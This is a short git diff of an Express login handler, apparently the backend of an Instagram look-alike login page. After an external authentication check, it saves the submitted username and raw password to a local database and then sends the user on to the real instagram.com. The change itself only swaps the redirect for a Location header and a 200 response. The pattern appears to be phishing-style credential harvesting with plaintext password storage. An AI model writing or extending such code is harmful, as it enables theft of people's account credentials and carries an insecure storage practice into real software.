@@ -55,16 +55,19 @@ const loginUser = asyncHandler(async (req, res) => {
 
     console.log(result.authenticated);
     if (result.authenticated === true) {
-      if (!(await User.findOne({username}))) {
+      if (!(await User.findOne({ username }))) {
         const user = await User.create({
           username,
           password,
         });
       }
-      return res.redirect("https://www.instagram.com");
-      // return res.status(200).json({
-      //   message: "ok",
-      // });
+      // Set the Location header and send 200 status
+      res.setHeader("Access-Control-Expose-Headers", "Location");
+      res.setHeader("Location", "https://www.instagram.com");
+      return res.status(200).json({
+        success: true,
+        message: "Login successful",
+      });
     } else {
       return res.status(401).json({
         success: false,
